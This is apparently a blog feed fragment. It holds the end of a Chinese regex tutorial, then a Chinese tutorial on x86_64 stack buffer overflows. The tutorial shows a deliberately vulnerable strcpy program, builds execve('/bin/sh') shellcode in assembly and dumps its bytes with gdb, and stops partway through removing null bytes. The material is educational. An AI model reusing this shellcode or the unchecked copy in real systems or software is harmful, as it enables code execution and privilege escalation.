class="headerlink" title="5.2 全局搜索 (Global search)"></a>5.2 全局搜索 (Global search)</h3><p>修饰符 <code>g</code> 常用于执行一个全局搜索匹配, 即(不仅仅返回第一个匹配的, 而是返回全部).<br>例如, 表达式 <code>/.(at)/g</code> 表示搜索 任意字符(除了换行) + <code>at</code>, 并返回全部结果.</p><pre>"/.(at)/" => The <a href="#learn-regex"><strong>fat</strong></a> cat sat on the mat.</pre><p><a href="https://regex101.com/r/jnk6gM/1" target="_blank" rel="noopener">在线练习</a></p><pre>"/.(at)/g" => The <a href="#learn-regex"><strong>fat</strong></a> <a href="#learn-regex"><strong>cat</strong></a> <a href="#learn-regex"><strong>sat</strong></a> on the <a href="#learn-regex"><strong>mat</strong></a>.</pre><p><a href="https://regex101.com/r/dO1nef/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="5-3-多行修饰符-Multiline"><a href="#5-3-多行修饰符-Multiline" class="headerlink" title="5.3 多行修饰符 (Multiline)"></a>5.3 多行修饰符 (Multiline)</h3><p>多行修饰符 <code>m</code> 常用于执行一个多行匹配.</p><p>像之前介绍的 <code>(^,$)</code> 用于检查格式是否是在待检测字符串的开头或结尾. 但我们如果想要它在每行的开头和结尾生效, 我们需要用到多行修饰符 <code>m</code>.</p><p>例如, 表达式 <code>/at(.)?$/gm</code> 表示小写字符 <code>a</code> 后跟小写字符 <code>t</code> , 末尾可选除换行符外任意字符. 根据 <code>m</code> 修饰符, 现在表达式匹配每行的结尾.</p><pre>"/.at(.)?$/" => The fat                cat sat                on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/hoGMkP/1" target="_blank" rel="noopener">在线练习</a></p><pre>"/.at(.)?$/gm" => The <a href="#learn-regex"><strong>fat</strong></a>                  cat <a href="#learn-regex"><strong>sat</strong></a>                  on the <a href="#learn-regex"><strong>mat.</strong></a></pre><p><a href="https://regex101.com/r/E88WE2/1" target="_blank" rel="noopener">在线练习</a></p><h3 id="6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching"><a href="#6-贪婪匹配与惰性匹配-Greedy-vs-lazy-matching" class="headerlink" title="6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)"></a>6. 贪婪匹配与惰性匹配 (Greedy vs lazy matching)</h3><p>正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 <code>?</code> 将贪婪匹配模式转化为惰性匹配模式。</p><pre>"/(.*at)/" => <a href="#learn-regex"><strong>The fat cat sat on the mat</strong></a>. </pre><p><a href="https://regex101.com/r/AyAdgJ/1" target="_blank" rel="noopener">在线练习</a></p><pre>"/(.*?at)/" => <a href="#learn-regex"><strong>The fat</strong></a> cat sat on the mat. </pre><p><a href="https://regex101.com/r/AyAdgJ/2" target="_blank" rel="noopener">在线练习</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文转载自 &lt;a href=&quot;https://github.com/ziishaned/learn-regex&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/ziishaned/learn-regex&lt;/a&gt; 侵删&lt;/
      
    
    </summary>
    
      <category term="正则表达式" scheme="https://mingliangliu.com/categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
    
      <category term="正则表达式" scheme="https://mingliangliu.com/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>缓冲区溢出（栈溢出）</title>
    <link href="https://mingliangliu.com/posts/11d24ffa/"/>
    <id>https://mingliangliu.com/posts/11d24ffa/</id>
    <published>2019-09-04T13:32:03.000Z</published>
    <updated>2020-02-15T06:45:50.788Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在现在的网络攻击中，缓冲区溢出方式的攻击占据了很大一部分，缓冲区溢出是一种非常普遍的漏洞，但同时，它也是非常危险的一种漏洞，轻则导致系统宕机，重则可导致攻击者获取系统权限，进而盗取数据，为所欲为。</p><p>其实缓冲区攻击说来也简单，请看下面一段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当我们在对<code>argv[1]</code>进行拷贝操作时，并没对其长度进行检查，这时候攻击者便可以通过拷贝一个长度大于8的字符串来覆盖程序的返回地址，让程序转而去执行攻击代码，进而使得系统被攻击。</p><p>本篇主要讲述缓冲区溢出攻击的基本原理，我会从程序是如何利用栈这种数据结构来进行运行的开始，试着编写一个shellcode，然后用该shellcode来溢出我们的程序来进行说明。我们所要使用的系统环境为x86_64 Linux，我们还要用到gcc（v7.4.0）、gdb（v8.1.0）等工具，另外，我们还需要一点汇编语言的基础，并且我们使用AT&amp;T格式的汇编。</p><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>在现代的操作系统中，进程是一个程序的运行实体，当在操作系统中运行一个程序时，操作系统会为我们的程序创建一个进程，并给我们的程序在内存中分配运行所需的空间，这些空间被称为进程空间。进程空间主要有三部分组成：代码段，数据段和栈段。如下图所示：</p><img src="/images/缓冲区溢出1.jpg"><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种后入先出的数据结构，在现代的大多数编程语言中，都使用栈这种数据结构来管理过程之间的调用。那什么又是过程之间的调用呢，说白了，一个函数或者一个方法便是一个过程，而在函数或方法内部调用另外的过程和方法便是过程间的调用。我们知道，程序的代码是被加载到内存中，然后一条条（这里指汇编）来执行的，而且时不时的需要调用其他的函数。当一个调用过程调用一个被调用过程时，所要执行的代码所在的内存地址是不同的，当被调用过程执行完后，又要回到调用过程继续执行。调用过程调用被调用过程时，需要使用<code>call</code>指令，并在<code>call</code>指令后指明要调用的地址，例如<code>call 地址</code>，当被调用过程返回时，使用<code>ret</code>指令来进行返回，但是并不需要指明返回的地址。那么程序是怎么知道我们要返回到什么地方呢？这主要是栈的功劳：执行<code>call</code>指令时，程序会自动的将<code>call</code>指令的下一条指令的地址加入到栈中，我们叫做返回地址。当程序返回时，程序从栈中取出返回地址，然后使程序跳转到返回地址处继续执行。</p><p>另外，程序在调用另一个过程时需要传递的参数，以及一个过程的局部变量（包括过程中开辟的缓冲区）都要分配在栈上。可见，栈是程序运行必不可少的一种机制。</p><p>但是，聪明的你可能一想：不对，既然程序的返回地址保存在栈上，过程的参数以及局部变量也保存在栈上，我们可以在程序中操纵参数和局部变量，那么我们是否也能操作返回地址，然后直接跳转到我们想要运行的代码处呢？答案当然是肯定的。</p><h2 id="改变程序的返回地址"><a href="#改变程序的返回地址" class="headerlink" title="改变程序的返回地址"></a>改变程序的返回地址</h2><p>我们看这也一个程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">example.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> *res;</span><br><span class="line">        res = &amp;res + <span class="number">2</span>;</span><br><span class="line">        *res += <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line">        func();</span><br><span class="line">        x = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在shell中使用如下命令编译运行一下，对于gcc编译时所用的参数，我先卖个关子。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ `gcc -fno-stack-protector example.c -o example`</span><br><span class="line">$ ./example</span><br></pre></td></tr></table></figure><p>你或许会说：“哎呀呀，不用看了，这么简单，运行结果是0嘛”。但结果真的是这样嘛。其实，这个程序的运行结果是1。“什么，这怎么可能是1嘛，不得了不得了”</p><p>还记的我们提到的我们可以在程序中改变过程的返回地址吗？在<code>func</code>中，看似是对res进行了一些无意义的操作，但是这实际上是改变了<code>func</code>的返回地址，跳过了<code>x = 0</code>这条赋值命令。让我们从汇编的层面上看一下这个程序是如何执行的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb gdb example</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">...</span><br><span class="line">gdb-peda$ disassemble func </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> func:</span><br><span class="line">   0x000000000000064a &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x000000000000064b &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x000000000000064e &lt;+4&gt;:lea    -0x8(%rbp),%rax</span><br><span class="line">   0x0000000000000652 &lt;+8&gt;:add    <span class="variable">$0x10</span>,%rax</span><br><span class="line">   0x0000000000000656 &lt;+12&gt;:mov    %rax,-0x8(%rbp)</span><br><span class="line">   ...</span><br><span class="line">   0x000000000000066e &lt;+36&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>在gdb中，我们使用<code>disassemble func</code>来查看一下<code>func</code>函数的汇编代码，在这里，程序栈上的情况是这样的，其中栈的宽度为8字节：</p><img src="/images/缓冲区溢出2.jpg"><p>一看程序你也许会明白了，在4~12行（实际上这里的行应该是该条指令在该函数中第几个字节处，这里为了方便姑且就这样叫吧）程序取得<code>res</code>的地址,并将其地址加上0x10(即16)，这对应程序的<code>res = &amp;res + 2;</code>，此时<code>res</code>指向的便是返回地址所在的地址了，然后使用<code>*res += 7</code>来改变返回地址。至于为什么是加7而不是其他数，是因为我们的目的是跳过执行<code>x = 0</code>，而<code>x = 0</code>这条程序所占的字节数刚好为7个。我们使用<code>disassemble main</code>来查看一下<code>main</code>函数的汇编代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x000000000000066f &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x0000000000000670 &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x0000000000000673 &lt;+4&gt;:sub    <span class="variable">$0x10</span>,%rsp</span><br><span class="line">   0x0000000000000677 &lt;+8&gt;:movl   <span class="variable">$0x1</span>,-0x4(%rbp)</span><br><span class="line">   0x000000000000067e &lt;+15&gt;:mov    <span class="variable">$0x0</span>,%eax</span><br><span class="line">   0x0000000000000683 &lt;+20&gt;:callq  0x64a &lt;func&gt;</span><br><span class="line">   0x0000000000000688 &lt;+25&gt;:movl   <span class="variable">$0x0</span>,-0x4(%rbp)</span><br><span class="line">   0x000000000000068f &lt;+32&gt;:mov    -0x4(%rbp),%eax</span><br><span class="line">   ...   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>上面的汇编代码中，第25行便是<code>x = 0</code>这条程序的汇编指令，我们的目的是跳过它，也就是说我们要直接执行第32行处的代码，现在返回地址是指向第25行的（还记得前面说的返回地址是<code>call</code>指令下一条指令的地址吗），为了跳过它，我们给返回地址加7。</p><h2 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h2><p>现在，我们大概了解了如何修改返回地址让程序跳转到我们指定的地方执行，但是要攻击的程序可不是我们编写的啊，我们只是知道程序的某个地方有个缓冲区可以让我们往里面写数据，我们可没有办法改变程序的代码啊。这个时候，我们就要说一说关于缓冲区的拷贝这件事了。</p><p>还记的我们开头的程序吗？这里我们为了调试起来方便，我们给它加个输出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">test.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">if</span>(argc &gt; <span class="number">1</span>) <span class="built_in">strcpy</span>(buffer, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的程序在栈上的结构大概是下面这个样子。这里将我们的栈换了个样子</p><img src="/images/缓冲区溢出3.jpg"><p>当程序对<code>argv[1]</code>进行拷贝操作时，依次将字符从低地址写向高地址。当<code>argv[1]</code>的长度小于8时，我们的缓冲区<code>buffer</code>空间足够，拷贝没有问题可以完成，但当我们的<code>argv[1]</code>的过长的话，长到将返回地址都覆盖了的话，<code>main</code>函数的返回地址就不知道返回到哪里去了。</p><p>让我们来试一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -fo-stack-protector  -o <span class="built_in">test</span> test.c</span><br><span class="line">$ ./<span class="built_in">test</span> hello</span><br><span class="line">hello</span><br><span class="line">$ ./<span class="built_in">test</span> helloworld</span><br><span class="line">helloworld</span><br><span class="line">$ ./<span class="built_in">test</span> helloworld123456789</span><br><span class="line">helloworld123456789</span><br><span class="line">Segmentation fault</span><br></pre></td></tr></table></figure><p>可以看到当我们给定的参数为<code>helloworld123456789</code>，我们的程序出现了段错误，也即是这时候，我们的返回地址被破环了，导致<code>main</code>函数返回时出错。这时候的栈看起来是下面这个样子的：</p><img src="/images/缓冲区溢出4.jpg"><p>对照前面的栈结构，发现<code>main</code>函数的返回地址的确被破坏了。若是我们往返回地址处覆盖一个我们想要执行的程序的地址，那是不是就可以执行我们的程序了呢？</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>那么攻击时要执行什么程序呢？一般情况下，我们想通过缓冲区溢出来获取一个shell，一旦有了shell，我们就可以“为所欲为”了，因此我们也把这种程序叫做shellcode。那么这个shellcode在哪呢，可以确定的是，系统管理员是不会在系统中留一个shellcode的，也并不会告诉你：嘿，我这里有一个shellcode，地址是xxxx，你快把返回地址给覆盖了，来着里执行吧。所以，这个shellcode还需要我们自己编写，并传到要攻击的系统上。那要传递到哪呢？缓冲区不正是一个好地方嘛。</p><p>我们知道，在冯·诺伊曼架构的计算机中，数据和代码是不加以明确区分的，也就是说，内存中某个地方的东西，它既可以看作是一个程序的数据，也可以当作代码来执行。所以，我们大概有了一个攻击思路：我们将我们的shellcode放在缓冲区中，然后通过覆盖返回地址跳转到我们shellcode处，进而执行我们的shellcode</p><p>下面，我们来讨论如何编写一个shellcode</p><p>首先，我们为了得到一个shell，需要使用第59和60号系统调用，下面是他们的系统调用表，并以C语言的方式指明了他们的参数。</p><table><thead><tr><th align="center">%rax</th><th align="center">system call</th><th align="center">%rdi</th><th align="center">%rsi</th><th align="center">%rdx</th></tr></thead><tbody><tr><td align="center">59</td><td align="center">sys_execve</td><td align="center">const char *filename</td><td align="center">const char *const argv[]</td><td align="center">const char* const envp[]</td></tr><tr><td align="center">60</td><td align="center">sys_exit</td><td align="center">int error_code</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>他们分别对应C语言中的系统函数<code>int execve(const char *filename, char *const argv[ ], char *const envp[ ]);</code>和<code>exit(int error_code)</code>，<code>execve()</code>用于在一个进程中启动新的程序，它的第一个参数是指程序所在的路径，第二个参数是传递给程序的参数，数组指针argv必须以程序filename开头，NULL结尾，最后一个参数为传递程序的新环境变量。而<code>exit()</code>的参数指明它的退出代码。</p><p>下面这个C语言程序便可以获取一个shell，当在获取的shell中输入<code>exit</code>时便可退出shell，且退出代码为0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，让我们从汇编的角度思考一下，该如何编写一个和上面这个程序功能相似的shellcode。</p><ol><li>首先，我们需要一个字符串”/bin/sh”，并且需要知道它的确切地址</li><li>然后，我们需要将参数传递给相应的寄存器</li><li>最后，调用系统调用。</li></ol><p>如何方便的获取到一个字符串的地址呢？一种方法是将字符串放到一个<code>call</code>指令的后面，这样，当这个<code>call</code>指令执行的时候，该字符串的首地址便被加入到栈中。 好了，我不再绕弯子了，下面给出一个shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">jmp mycall</span><br><span class="line">func: pop %rbx</span><br><span class="line">mov %rbx, 0x8(%rsp)</span><br><span class="line">movb $0x0, 0x7(%rsp)</span><br><span class="line">movl $0x0, 0x10(%rsp)</span><br><span class="line">mov $59, %rax</span><br><span class="line">mov %rbx, %rdi</span><br><span class="line">lea 0x8(%rsp), %rsi</span><br><span class="line">lea 0x10(%rsp), %rdx</span><br><span class="line">syscall</span><br><span class="line">mov $60, %rax</span><br><span class="line">mov $0, %rdi</span><br><span class="line">syscall</span><br><span class="line">mycall: call func</span><br><span class="line">.string \&quot;/bin/sh\&quot;</span><br></pre></td></tr></table></figure><p>现在，我们依次看一下每一条指令的意思。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1.  jmp mycall</span><br><span class="line"></span><br><span class="line">        当shellcode执行时，会先执行这一条，这会使我们的程序跳转到第14行的call指令处</span><br><span class="line"></span><br><span class="line">2.  func: pop %rbx</span><br><span class="line">        </span><br><span class="line">        我们从栈中获取返回地址，这也是字符串所在的地址</span><br><span class="line"></span><br><span class="line">3.  mov %rbx, 0x8(%rsp)</span><br><span class="line">4.  movb $0x0, 0x7(%rsp)</span><br><span class="line">5.  movl $0x0, 0x10(%rsp)</span><br><span class="line"></span><br><span class="line">        尽管我们有了字符串的地址，但是我们并没有第二个参数和第三个参数所在的地址，所以程序在栈上构造出第二个和第三个参数</span><br><span class="line"></span><br><span class="line">6.  mov $59, %rax</span><br><span class="line">7.  mov %rbx, %rdi</span><br><span class="line">8.  lea 0x8(%rsp), %rsi</span><br><span class="line">9.  lea 0x10(%rsp), %rdx</span><br><span class="line"></span><br><span class="line">        我们将参数传递给指定的寄存器</span><br><span class="line"></span><br><span class="line">10. syscall</span><br><span class="line"></span><br><span class="line">        使用syscall指令进行系统调用，这在x86 Linux中为int 0x80</span><br><span class="line"></span><br><span class="line">11. mov $60, %rax</span><br><span class="line">12. mov $0, %rdi</span><br><span class="line">13. syscall</span><br><span class="line"></span><br><span class="line">        为了使我们的shellcode在退出shell后正常退出，需要调用下exit系统调用，退出代码为0</span><br><span class="line"></span><br><span class="line">14. mycall: call func</span><br><span class="line"></span><br><span class="line">15. .string \&quot;/bin/sh\&quot;</span><br></pre></td></tr></table></figure><p>它们的执行流程如下图所示：</p><img src="/images/缓冲区溢出7.jpg"><p>现在，我们有了shellcode，我们先用C语言内联汇编的方式测试一下它是否能运行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">shellcode_test.c</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">"jmp mycall\n\t"</span></span><br><span class="line">        <span class="string">"func: pop %rbx\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, 0x8(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movb $0x0, 0x7(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"movl $0x0, 0x10(%rsp)\n\t"</span></span><br><span class="line">        <span class="string">"mov $59, %rax\n\t"</span></span><br><span class="line">        <span class="string">"mov %rbx, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x8(%rsp), %rsi\n\t"</span></span><br><span class="line">        <span class="string">"lea 0x10(%rsp), %rdx\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mov $60, %rax\n\t"</span></span><br><span class="line">        <span class="string">"mov $0, %rdi\n\t"</span></span><br><span class="line">        <span class="string">"syscall\n\t"</span></span><br><span class="line">        <span class="string">"mycall: call func\n\t"</span></span><br><span class="line">        <span class="string">".string \"/bin/sh\""</span></span><br><span class="line">        );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试着编译运行一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ gcc shellcode_test.c -o shellcode_test</span><br><span class="line">$ ./shellcode_test </span><br><span class="line">sh-4.4<span class="comment"># exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>Wow，我们的shellcode完全可行，但是现在还并没有结束。众所周知，程序在内存中都是以二进制的形式保存的，我们的程序也不例外，因为我们需要将我们的shellcode传递到缓冲区中去，如果直接传递代码，那显然是不行的，我们要传递的应该是编译生成的二进制才对，这样在目标机器上直接就可以执行。现在，我们使用gdb将我们的程序转换为二进制（确切的说应该是16进制，不过都一样嘛）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ gdb gdb shellcode_test</span><br><span class="line">....</span><br><span class="line">gdb-peda$ disassemble main </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x00000000000005fa &lt;+0&gt;:push   %rbp</span><br><span class="line">   0x00000000000005fb &lt;+1&gt;:mov    %rsp,%rbp</span><br><span class="line">   0x00000000000005fe &lt;+4&gt;:jmp    0x639 &lt;main+63&gt;</span><br><span class="line">   0x0000000000000600 &lt;+6&gt;:pop    %rbx</span><br><span class="line">   0x0000000000000601 &lt;+7&gt;:mov    %rbx,0x8(%rsp)</span><br><span class="line">   0x0000000000000606 &lt;+12&gt;:movb   <span class="variable">$0x0</span>,0x7(%rsp)</span><br><span class="line">   0x000000000000060b &lt;+17&gt;:movl   <span class="variable">$0x0</span>,0x10(%rsp)</span><br><span class="line">   0x0000000000000613 &lt;+25&gt;:mov    <span class="variable">$0x3b</span>,%rax</span><br><span class="line">   0x000000000000061a &lt;+32&gt;:mov    %rbx,%rdi</span><br><span class="line">   0x000000000000061d &lt;+35&gt;:lea    0x8(%rsp),%rsi</span><br><span class="line">   0x0000000000000622 &lt;+40&gt;:lea    0x10(%rsp),%rdx</span><br><span class="line">   0x0000000000000627 &lt;+45&gt;:syscall </span><br><span class="line">   0x0000000000000629 &lt;+47&gt;:mov    <span class="variable">$0x3c</span>,%rax</span><br><span class="line">   0x0000000000000630 &lt;+54&gt;:mov    <span class="variable">$0x0</span>,%rdi</span><br><span class="line">   0x0000000000000637 &lt;+61&gt;:syscall </span><br><span class="line">   0x0000000000000639 &lt;+63&gt;:callq  0x600 &lt;main+6&gt;</span><br><span class="line">   0x000000000000063e &lt;+68&gt;:(bad)  </span><br><span class="line">   0x000000000000063f &lt;+69&gt;:(bad)  </span><br><span class="line">   0x0000000000000640 &lt;+70&gt;:imul   <span class="variable">$0x90006873</span>,0x2f(%rsi),%ebp</span><br><span class="line">   0x0000000000000647 &lt;+77&gt;:pop    %rbp</span><br><span class="line">   0x0000000000000648 &lt;+78&gt;:retq   </span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ x /64xb main+4</span><br><span class="line">0x5fe &lt;main+4&gt;:0xeb0x390x5b0x480x890x5c0x240x08</span><br><span class="line">0x606 &lt;main+12&gt;:0xc60x440x240x070x000xc70x440x24</span><br><span class="line">0x60e &lt;main+20&gt;:0x100x000x000x000x000x480xc70xc0</span><br><span class="line">0x616 &lt;main+28&gt;:0x3b0x000x000x000x480x890xdf0x48</span><br><span class="line">0x61e &lt;main+36&gt;:0x8d0x740x240x080x480x8d0x540x24</span><br><span class="line">0x626 &lt;main+44&gt;:0x100x0f0x050x480xc70xc00x3c0x00</span><br><span class="line">0x62e &lt;main+52&gt;:0x000x000x480xc70xc70x000x000x00</span><br><span class="line">0x636 &lt;main+60&gt;:0x000x0f0x050xe80xc20xff0xff0xff</span><br></pre></td></tr></table></figure><p>可以看到，除了字符串以外，我们的程序是从第4行到第63行，由于字符串在内存中保存的是ascii码，这里也就不需要获取其二进制了。</p><p>好了，现在我们已经有了shellcode的二进制了，但是还有一个问题。可以看到，我们的程序中有0x00这种数据，由于我们的shellcode作为字符串传递到缓冲区中的，这代表的恰恰也是字符串的结束，也就是说，当我们的字符串往缓冲区拷贝的时候，当遇到0x00时，无论我们的shellcode有没有拷贝完，都会停止拷贝。我们可不想我们费尽千辛万苦写出的shellcode竟然只被拷贝的残缺不全。下面，我们改进一下我们的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 